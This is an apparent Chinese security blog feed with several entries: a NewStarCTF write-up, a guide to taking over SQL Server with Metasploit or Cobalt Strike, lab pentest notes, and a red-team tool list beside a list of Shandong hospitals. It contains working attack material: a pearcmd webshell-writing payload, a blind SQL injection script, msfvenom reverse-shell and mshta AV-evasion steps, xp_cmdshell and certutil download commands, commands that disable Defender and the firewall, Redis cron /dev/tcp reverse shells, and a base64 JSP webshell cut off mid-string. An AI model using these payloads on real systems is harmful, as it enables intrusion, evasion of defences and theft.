class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/lemonlove7/EHole_magic</span><br><span class="line">fofa联动EHole 在poc扫描</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https://github.com/0x727/ShuiZe_0x727</span><br><span class="line">给个关键字，自动收集,用起来还可以，自动加载poc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https://github.com/EASY233/Finger</span><br><span class="line">一款红队在大量的资产中存活探测与重点攻击系统指纹探测工具</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">https://github.com/EdgeSecurityTeam/EHole</span><br><span class="line">EHole(棱洞)3.0 红队重点攻击系统指纹探测工具</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://www.a-hospital.com/w/%E5%B1%B1%E4%B8%9C%E7%9C%81%E4%B8%89%E7%BA%A7%E7%94%B2%E7%AD%89%E5%8C%BB%E9%99%A2%E5%88%97%E8%A1%A8</span><br><span class="line">山东所有三甲三乙医院</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http://wsjkw.shandong.gov.cn/</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF2023公开赛道WEEK3</title>
      <link href="/2023/11/27/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93WEEK2/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93WEEK3/"/>
      <url>/2023/11/27/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93WEEK2/NewStarCTF2023%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93WEEK3/</url>
      
        <content type="html"><![CDATA[<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="Include-🍐"><a href="#Include-🍐" class="headerlink" title="Include 🍐"></a>Include 🍐</h5><p>经典文件包含写shell，进行rce，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag|log|session|filter|input|data/i&#x27;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">        <span class="comment"># Something in phpinfo.php!</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>打phpinfo的时候，是存在假flag的的，fake{Check_register_argc_argv}，让打这个register_argc_argv函数</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20231127153538006.png" alt="image-20231127153538006"></p><p>经典打法，看这函数是否是on</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20231127153719625.png" alt="image-20231127153719625"></p><p>直接poc打，写入文件即可，<code>/?file=/usr/local/lib/php/pearcmd&amp;aaaa+config-create+/var/www/html/&lt;?=eval($_POST[1]);?&gt;+32.php</code></p><p>详细见大师傅博客<code>https://cloud.tencent.com/developer/article/2204400?areaId=106001</code></p><p>即可写入webshell，建议burp中打，不然容易乱码。</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20231127153922543.png" alt="image-20231127153922543"></p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20231127153942182.png" alt="image-20231127153942182"></p><h5 id="medium-sql"><a href="#medium-sql" class="headerlink" title="medium_sql"></a>medium_sql</h5><p>好像和上周的一样，大小写绕过即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 导入所需模块</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造字母表，根据字母表去爆破每一位的具体值</span></span><br><span class="line">alphabet = <span class="string">&quot;-,&#125;&#123;_=&quot;</span> + string.ascii_letters + string.digits</span><br><span class="line"><span class="built_in">print</span>(alphabet)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 题目的URL</span></span><br><span class="line">url = <span class="string">&quot;http://eacaf619-8013-4e77-b7fb-608613da574e.node4.buuoj.cn:81/?id=TMP11503&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注入什么数据，select变量就写什么子查询语句</span></span><br><span class="line">select = <span class="string">&quot;select database()&quot;</span> </span><br><span class="line">select = <span class="string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span> <span class="comment">#获取所有库名</span></span><br><span class="line">select = <span class="string">&quot;select group_concat(table_name) from information_schema.tables where table_schema=&#x27;ctf&#x27;&quot;</span> <span class="comment">#获取表名</span></span><br><span class="line">select = <span class="string">&quot;select group_concat(column_name) from information_schema.columns where table_schema=&#x27;ctf&#x27; and table_name=&#x27;here_is_flag&#x27;&quot;</span><span class="comment">#获取字段名</span></span><br><span class="line"></span><br><span class="line">select = <span class="string">&quot;select flag from ctf.here_is_flag&quot;</span> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用来保存注入出的结果</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>): <span class="comment"># 外层循环，从1开始，因为截取的位数是从1开始的</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> alphabet: <span class="comment"># 内层循环，是具体需要测试的值</span></span><br><span class="line">        <span class="comment"># 构造SQL语句，发起请求</span></span><br><span class="line">        <span class="comment">#payload = f&quot;&#x27; AND subStr((selEct database()) ,&#123;i&#125;,1) = &#x27;&#123;ch&#125;&#x27; AND &#x27;YSGl&#x27;=&#x27;YSGl&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;&#x27; AND subStr((SELECT flag FROM here_is_flag) ,<span class="subst">&#123;i&#125;</span>,1) = &#x27;<span class="subst">&#123;ch&#125;</span>&#x27; AND &#x27;YSGl&#x27;=&#x27;YSGl&quot;</span></span><br><span class="line">        r = requests.get(url=url+payload)</span><br><span class="line">        <span class="comment"># 根据回显判断，如果得到了表示查询成功的回显，那么说明判断数据的这一位是正确的</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(ch) &lt; <span class="number">66</span> : </span><br><span class="line">            time.sleep(<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;class_name&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            result += ch </span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;注入成功：&quot;</span>, result)</span><br><span class="line">            <span class="comment">#print(url+payload)</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">break</span> <span class="comment"># 这一位已经跑出来了，可以break掉然后下一轮循环跑下一位数据了</span></span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20231127161313732.png" alt="image-20231127161313732"></p><h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h5 id="阳光开朗大男孩"><a href="#阳光开朗大男孩" class="headerlink" title="阳光开朗大男孩"></a>阳光开朗大男孩</h5><p>社会主义核心价值码+emoji-aes<br><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20231127163200996.png" alt="image-20231127163200996"></p><p>拿到passwd，直接解即可<code>https://aghorler.github.io/emoji-aes/</code></p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20231127163222217.png" alt="image-20231127163222217"></p><h5 id="大怨种"><a href="#大怨种" class="headerlink" title="大怨种"></a>大怨种</h5><p>gif里面有二维码，用stegsolve即可，点击analyse-&gt;framebrowser，左右点点即可。</p><p>是一个汉信码，百度汉信码解码找一个，<img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20231127163841521.png" alt="image-20231127163841521"></p><h5 id="2-分析"><a href="#2-分析" class="headerlink" title="2-分析"></a>2-分析</h5><p>但你心中仍然有一种不祥的预感，这时你的同事告诉你这台服务器已经被攻击者获取到了权限，需要你尽快去还原攻击者的攻击路径，调查清楚攻击者是如何获取到服务器权限的。；FLAG格式flag{md5(攻击者登录使用的用户名_存在漏洞的文件名_WebShell文件名)}；例如flag{testuser_123.php_shell.php}，将括号内的内容进行md5编码得到flag{58aec571c731faae1369b461d3927596}即为需要提交的Flag</p><p>``http.request.method==”POST”`登录的话直接过滤post方式，第一个就是</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20231127164806365.png" alt="image-20231127164806365"></p><p>302说明成功，user就是best_admin</p><p>然后筛选马子，正常上传文件也是POST，但是这次不是，我没可以<code>http.response.code!=404</code>因为里面有很多扫描的信息，执行命令肯定有回显，所以从下点点看回显包，这里注意404不要加引号<img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20231127170220126.png" alt="image-20231127170220126"></p><p>可以看到在index.php，执行了get命令，打了get的马子，那么</p><p>flag=best_admin_index.php_wh1t3g0d.php的md5=4069afd7089f7363198d899385ad688b</p><h5 id="medium-sql-1"><a href="#medium-sql-1" class="headerlink" title="medium_sql"></a>medium_sql</h5><h5 id="medium-sql-2"><a href="#medium-sql-2" class="headerlink" title="medium_sql"></a>medium_sql</h5>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sqlserver上线csormsf</title>
      <link href="/2023/11/26/sqlserver%E4%B8%8A%E7%BA%BFcsormsf/"/>
      <url>/2023/11/26/sqlserver%E4%B8%8A%E7%BA%BFcsormsf/</url>
      
        <content type="html"><![CDATA[<p>当我没拿到一个sqlserver的权限时，权限很小，且有waf的情况下，且只能透过web执行命令，上线到msf或者cs。</p><p><img src="/images/others/image-20231126153013346.png" alt="image-20231126153013346"></p><p>先看一下杀软</p><p><img src="/images/others/image-20231126153201821.png" alt="image-20231126153201821"></p><p>很多，还有国外的。</p><p>这里采用mshta免杀上线，参考文章<code>https://www.zhihuifly.com/t/topic/2534</code></p><p>首先整个模板文件<a href="https://raw.githubusercontent.com/mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.hta%EF%BC%8C%E5%9C%A8%E8%BF%99%E4%B8%AA%E9%87%8C%EF%BC%8C">https://raw.githubusercontent.com/mdsecactivebreach/CACTUSTORCH/master/CACTUSTORCH.hta，在这个里，</a></p><p>然后使用cs 或者msf生成一个raw 文件</p><p><code>msfvenom -a x86 -p windows/meterpreter/reverse_https LHOST=10.211.55.2 LPORT=3333 -f raw -o payload.bin</code></p><p>cs  attacks</p><p><img src="/images/others/image-20231126154223169.png" alt="image-20231126154223169"></p><p>这里注意是32位的</p><p>然后<code>cat payload.bin | base64 -w 0</code></p><p><img src="/images/others/image-20231126153450897.png" alt="image-20231126153450897"></p><p>把得到的内容写进模板里</p><p><img src="/images/others/image-20231126154351504.png" alt="image-20231126154351504"></p><p>然后起一个python服务器即可，</p><p>msf的要起监听</p><p>use exploit/multi/handler</p><p>payload 换掉  set payload windows/meterpreter/reverse_https</p><p>执行命令即可</p><p><code>mshta http://ip:port/msta.hta</code></p><p><img src="/images/others/image-20231126154622099.png" alt="image-20231126154622099"></p><p><img src="/images/others/image-20231126154730372.png" alt="image-20231126154730372"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cmd= <span class="string">&quot;;DECLARE @er VARCHAR(8000);SET @er=0x16进制;EXEC master..xp_cmdshell @er&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd2=<span class="string">&quot;declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c whoami&#x27;&quot;</span></span><br><span class="line">cmd3=<span class="string">&quot;declare @o int exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out exec sp_oamethod @o, &#x27;copyfile&#x27;,null,&#x27;C:\Windows\System32\certutil.exe&#x27; ,&#x27;c:\windows\temp\sethc.exe&#x27;;&quot;</span></span><br><span class="line">cmd4=<span class="string">&quot;declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;C:\Windows\Temp\sethc.exe -urlcache -split -f &#x27;http://ip:port/SKXT.exe&#x27; C:\Windows\Temp\shell.exe&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd11=<span class="string">&quot;exec sp_configure &#x27;show advanced options&#x27;, 1;  RECONFIGURE;  exec sp_configure &#x27;Ole Automation Procedures&#x27;, 1;  RECONFIGURE;&quot;</span></span><br><span class="line">cmd12=<span class="string">&quot;declare @o int exec sp_oacreate &#x27;scripting.filesystemobject&#x27;, @o out exec sp_oamethod @o, &#x27;copyfile&#x27;,null,&#x27;C:\\Windows\\System32\\certutil.exe&#x27; ,&#x27;c:\\windows\\temp\\sethc.exe&#x27;;&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
            <tag> cs </tag>
            
            <tag> sqlserver </tag>
            
            <tag> msf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cfs</title>
      <link href="/2023/11/17/cfs/cfs/"/>
      <url>/2023/11/17/cfs/cfs/</url>
      
        <content type="html"><![CDATA[<p>root密码：teamssix.com</p><p>此主机的IP地址：<br>192.168.1.11<br>192.168.22.11</p><p>宝塔后台登陆地址及密码：<br>地址：<a href="http://192.168.1.11:8888/a768f109/">http://192.168.1.11:8888/a768f109/</a><br>账号：eaj3yhsl<br>密码：41bb8fee</p><p>root密码：teamssix.com</p><p>此主机的IP地址：<br>192.168.22.22<br>192.168.33.22</p><p>宝塔后台登陆地址及密码：<br>地址：<a href="http://192.168.22.22:8888/2cc52ec0/">http://192.168.22.22:8888/2cc52ec0/</a><br>账号：xdynr37d<br>密码：123qwe..</p><p>GET /index.php?r=vul&amp;keyword=1’ union%20select%20database(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39–%20123<br><a href="http://192.168.22.129/index.php?r=vul&amp;keyword=1&#39;">http://192.168.22.129/index.php?r=vul&amp;keyword=1&#39;</a> union select databases(),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39– 123<br>GET /index.php?r=vul&amp;keyword=1’ union select database(),1,group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39  from information_schema.tables where table_schema=’bagecms’–%2012<br>bage_ad,bage_admin,bage_admin_group,bage_admin_logger,bage_attr,bage_attr_val,bage_catalog,bage_config,bage_link,bage_page,bage_post,bage_post_2tags,bage_post_album,bage_post_comment,bage_post_tags,bage_question,bage_special,bage_upload</p><p>id,username,password,realname,group_id,email,qq,notebook,mobile,telephone,last_login_ip,last_login_time,login_count,status_is,create_time<br>GET /index.php?r=vul&amp;keyword=1’ union select database(),1,1,id,username,password,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39 from bagecms.bage_admin–%20123 HTTP/1.1<br>Array<br>(<br>    [0] =&gt; Post Object<br>        (<br>            [_new:CActiveRecord:private] =&gt;<br>            [_attributes:CActiveRecord:private] =&gt; Array<br>                (<br>                    [id] =&gt; bagecms<br>                    [user_id] =&gt; 1<br>                    [nickname] =&gt; 1<br>                    [author] =&gt; 1<br>                    [title] =&gt; admin<br>                    [title_second] =&gt; 46f94c8de14fb36680850768ff1b7f2a<br>123qwe</p><p>./ew -s lcx_tran -l 17777 -f 192.168.22.129 -g 17775 -t 1000000<br>./ew -s ssocksd -l 17775 -t 1000000</p><p>中间机器<br>./ew -s lcx_slave -d 192.168.144.142 -e 37779 -f 192.168.33.33 -g 39999 -t 100000</p><p>左边机器<br>./ew -s lcx_listen -l 37777 -e 37779 -t 100000</p><p>右边机器<br>.\ew_for_Win.exe -s ssocksd -l 39999 -t 100000</p><p>setg Proxies socks5:ip2:8321 设置全局代理<br>set ReverseAllowProxy true 这个参数是因为使用全局代理，可能会导致我们的shell无法反弹，所以需要开启。<br>ip2:8321</p><p>中间zuo机器<br>./ew -s lcx_slave -d 192.168.144.142 -e 37779 -f 192.168.33.33 -g 39998 -t 100000</p><p>中间you机器<br>.\ew_for_Win.exe -s lcx_slave -d 192.168.22.129 -e 39998 -f 192.168.44.130 -g 39989 -t 100000<br>.\ew_for_Win.exe -s lcx_slave -d 192.168.33.128 -e 39998 -f 192.168.44.130 -g 39989 -t 100000<br>左边机器<br>./ew -s lcx_listen -l 37777 -e 37779 -t 100000</p><p>右边机器<br>.\ew_for_Win.exe -s ssocksd -l 39989 -t 100000</p><p>proxychains nmap -Pn -sT -T4 -F 192.168.88.100</p><p>8A..;123admin</p><p>dynamic_chain ：动态模式,按照代理列表顺序自动选取可用代理<br>strict_chain ：严格模式,严格按照代理列表顺序使用代理，所有代理必须可用<br>round_robin_chain ：轮询模式，自动跳过不可用代理<br>random_chain ：随机模式,随机使用代理</p><p>administrator/admin@123</p><p>vulntarget\win2008<br>qweASD123</p><p>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</p><p>netsh advfirewall set allprofiles state off</p><p>set-MpPreference -DisableRealtimeMonitoring $true</p><p>dir \WIN-1PV25H8UJPN.vulntarget.com dir<br>schtasks /create /s WIN-1PV25H8UJPN.vulntarget.com /tn test /sc minute /mo 1 /tr “C:\Windows\System32\cmd.exe /c ‘whoami &gt; C:\Users\Administrator\result.txt’” /ru system /f<br>dir \WIN-1PV25H8UJPN.vulntarget.com\C$<br>C:\Users\Administrator\Desktop\PSTools&gt;PsExec.exe -accepteula \WIN-1PV25H8UJPN cmd.exe</p><p>set xxoo “\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/172.16.100.21/10001 0&gt;&amp;1\n\n”</p><p>proxychains echo -e “\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/172.16.100.21/1234 0&gt;&amp;1\n\n”|redis-cli -h 172.17.20.250 -a 123456 -x set 1<br>proxychains redis-cli -h 172.17.20.250 -a 123456 config set dir /var/spool/cron/<br>proxychains redis-cli -h 172.17.20.250 -a 123456 config set dbfilename redis<br>proxychains redis-cli -h 172.17.20.250 -a 123456 save</p><p>nc -l -p 1234 -vv</p><p>/ /<em>\_</em><strong><em>_</em> \ (</strong>| | | (<em>| | (<strong>|   &lt;<br>_</strong></em>/     |<em><strong>/_</strong>|</em>|  _<em>,</em>|__<em>|</em>|_<br>                     fscan version: 1.6.3<br>start infoscan<br>(icmp) Target ‘172.17.20.1’ is alive<br>(icmp) Target ‘172.17.20.10’ is alive<br>(icmp) Target ‘172.17.20.110’ is alive<br>(icmp) Target ‘172.17.20.250’ is alive<br>(icmp) Target ‘172.17.20.113’ is alive<br>icmp alive hosts len is: 5<br>172.17.20.110:7001 open</p><p>172.17.20.250:6379 open<br>172.17.20.250:3306 open</p><p>172.17.20.113:445 open<br>172.17.20.113:139 open</p><p>172.17.20.250:22 open<br>172.17.20.113:135 open<br>172.17.20.113:80 open</p><p>172.17.20.10:80 open</p><p>172.17.20.10:22 open<br>172.17.20.10:443 open<br>172.17.20.1:3000 open<br>alive ports len is: 12<br>start vulscan<br>[+] Redis:172.17.20.250:6379 123456<br>[+] Redis:172.17.20.250:6379 like can write /var/spool/cron/<br>NetInfo:<br>[<em>]172.17.20.113<br>   [-&gt;]WIN-MS7AC966K31<br>   [-&gt;]172.17.20.113<br>[</em>] WebTitle:<a href="http://172.17.20.113/">http://172.17.20.113</a>      code:200 len:39     title:Office Anywhere 2017版 网络智能办公系统<br>[<em>] 172.17.20.113        WORKGROUP\WIN-MS7AC966K31   Windows Server 2012 R2 Standard 9600<br>[+] InfoScan:<a href="http://172.17.20.113/">http://172.17.20.113</a>      [通达OA]<br>[</em>] WebTitle:<a href="http://172.17.20.10/">http://172.17.20.10</a>       code:200 len:7      title:Meetsec<br>[*] WebTitle:<a href="https://172.17.20.10/">https://172.17.20.10</a>      code:200 len:7      title:Meetsec</p><p>/home/acequan/Oracle/Middleware/Oracle_Home/user_projects/domains/wl_server/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war</p><p>bash -i &gt;&amp; /dev/tcp/172.16.100.21/10002 0&gt;&amp;1</p><p>echo PCUhIFN0cmluZyB4Yz0iM2M2ZTBiOGE5YzE1MjI0YSI7IFN0cmluZyBwYXNzPSJwYXNzIjsgU3RyaW5nIG1kNT1tZDUocGFzcyt4Yyk7IGNsYXNzIFggZXh0ZW5kcyBDbGFzc0xvYWRlcntwdWJsaWMgWChDbGFzc0xvYWRlciB6KXtzdXBlcih6KTt9cHVibGljIENsYXNzIFEoYnl0ZVtdIGNiKXtyZXR1cm4gc3VwZXIuZGVmaW5lQ2xhc3MoY2IsIDAsIGNiLmxlbmd0aCk7fSB9cHVibGljIGJ5dGVbXSB4KGJ5dGVbXSBzLGJvb2xlYW4gbSl7IHRyeXtqYXZheC5jcnlwdG8uQ2lwaGVyIGM9amF2YXguY3J5cHRvLkNpcGhlci5nZXRJbnN0YW5jZSgiQUVTIik7Yy5pbml0KG0/MToyLG5ldyBqYXZheC5jcnlwdG8uc3BlYy5TZWNyZXRLZXlTcGVjKHhjLmdldEJ5dGVzKCksIkFFUyIpKTtyZXR1cm4gYy5kb0ZpbmFsKHMpOyB9Y2F0Y2ggKEV4Y2VwdGlvbiBlKXtyZXR1cm4gbnVsbDsgfX0gcHVibGljIHN0YXRpYyBTdHJpbmcgbWQ1KFN0cmluZyBzKSB7U3RyaW5nIHJldCA9IG51bGw7dHJ5IHtqYXZhLnNlY3VyaXR5Lk1lc3NhZ2VEaWdlc3QgbTttID0gamF2YS5zZWN1cml0eS5NZXNzYWdlRGlnZXN0LmdldEluc3RhbmNlKCJNRDUiKTttLnVwZGF0ZShzLmdldEJ5dGVzKCksIDAsIHMubGVuZ3RoKCkpO3JldCA9IG5ldyBqYXZhLm1hdGguQmlnSW50ZWdlcigxLCBtLmRpZ2VzdCgpKS50b1N0cmluZygxNikudG9VcHBlckNhc2UoKTt9IGNhdGNoIChFeGNlcHRpb24gZSkge31yZXR1cm4gcmV0OyB9IHB1YmxpYyBzdGF0aWMgU3RyaW5nIGJhc2U2NEVuY29kZShieXRlW10gYnMpIHRocm93cyBFeGNlcHRpb24ge0NsYXNzIGJhc2U2NDtTdHJpbmcgdmFsdWUgPSBudWxsO3RyeSB7YmFzZTY0PUNsYXNzLmZvck5hbWUoImphdmEudXRpbC5CYXNlNjQiKTtPYmplY3QgRW5jb2RlciA9IGJhc2U2NC5nZXRNZXRob2QoImdldEVuY29kZXIiLCBudWxsKS5pbnZva2UoYmFzZTY0LCBudWxsKTt2YWx1ZSA9IChTdHJpbmcpRW5jb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZW5jb2RlVG9TdHJpbmciLCBuZXcgQ2xhc3NbXSB7IGJ5dGVbXS5jbGFzcyB9KS5pbnZva2UoRW5jb2RlciwgbmV3IE9iamVjdFtdIHsgYnMgfSk7fSBjYXRjaCAoRXhjZXB0aW9uIGUpIHt0cnkgeyBiYXNlNjQ9Q2xhc3MuZm9yTmFtZSgic3VuLm1pc2MuQkFTRTY0RW5jb2RlciIpOyBPYmplY3QgRW5jb2RlciA9IGJhc2U2NC5uZXdJbnN0YW5jZSgpOyB2YWx1ZSA9IChTdHJpbmcpRW5jb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZW5jb2RlIiwgbmV3IENsYXNzW10geyBieXRlW10uY2xhc3MgfSkuaW52b2tlKEVuY29kZXIsIG5ldyBPYmplY3RbXSB7IGJzIH0pO30gY2F0Y2ggKEV4Y2VwdGlvbiBlMikge319cmV0dXJuIHZhbHVlOyB9IHB1YmxpYyBzdGF0aWMgYnl0ZVtdIGJhc2U2NERlY29kZShTdHJpbmcgYnMpIHRocm93cyBFeGNlcHRpb24ge0NsYXNzIGJhc2U2NDtieXRlW10gdmFsdWUgPSBudWxsO3RyeSB7YmFzZTY0PUNsYXNzLmZvck5hbWUoImphdmEudXRpbC5CYXNlNjQiKTtPYmplY3QgZGVjb2RlciA9IGJhc2U2NC5nZXRNZXRob2QoImdldERlY29kZXIiLCBudWxsKS5pbnZva2UoYmFzZTY0LCBudWxsKTt2YWx1ZSA9IChieXRlW10pZGVjb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZGVjb2RlIiwgbmV3IENsYXNzW10geyBTdHJpbmcuY2xhc3MgfSkuaW52b2tlKGRlY29kZXIsIG5ldyBPYmplY3RbXSB7IGJzIH0pO30gY2F0Y2ggKEV4Y2VwdGlvbiBlKSB7dHJ5IHsgYmFzZTY0PUNsYXNzLmZvck5hbWUoInN1bi5taXNjLkJBU0U2NERlY29kZXIiKTsgT2JqZWN0IGRlY29kZXIgPSBiYXNlNjQubmV3SW5zdGFuY2UoKTsgdmFsdWUgPSAoYnl0ZVtdKWRlY29kZXIuZ2V0Q2xhc3MoKS5nZXRNZXRob2QoImRlY29kZUJ1ZmZlciIsIG5ldyBDbGFzc1tdIHsgU3RyaW5nLmNsYXNzIH0pLmludm9rZShkZWNvZGVyLCBuZXcgT2JqZWN0W10geyBicyB9KTt9IGNhdGNoIChFeGNlcHRpb24gZTIpIHt9fXJldHVybiB2YWx1ZTsgfSU+PCV0cnl7Ynl0ZVtdIGRhdGE9YmFzZTY0RGVjb2RlKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKHBhc3MpKTtkYXRhPXgoZGF0YSwgZmFsc2UpO2lmIChzZXNzaW9uLmdldEF0dHJpYnV0ZSgicGF5bG9hZCIpPT1udWxsKXtzZXNzaW9uLnNldEF0dHJpYnV0ZSgicGF5bG9hZCIsbmV3IFgodGhpcy5nZXRDbGFzcygpLmdldENsYXNzTG9hZGVyKCkpLlEoZGF0YSkpO31lbHNle3JlcXVlc3Quc2V0QXR0cmlidXRlKCJwYXJhbWV0ZXJzIixkYXRhKTtqYXZhLmlvLkJ5dGVBcnJheU91dHB1dFN0cmVhbSBhcnJPdXQ9bmV3IGphdmEuaW8uQnl0ZUFycmF5T3V0cHV0U3RyZWFtKCk7T2JqZWN0IGY9KChDbGFzcylzZXNzaW9uLmdldEF0dHJpYnV0ZSgicGF5bG9hZCIpKS5uZXdJbnN0YW5jZSgpO2YuZXF1YWxzKGFyck91dCk7Zi5lcXVhbHMocGFnZUNvbnRleHQpO3Jlc3BvbnNlLmdldFdyaXRlcigpLndyaXRlKG1kNS5zdWJzdHJpbmcoMCwxNikpO2YudG9TdHJpbmcoKTtyZXNwb25zZS5nZXRXcml0ZXIoKS53cml0ZShiYXNlNjRFbmNv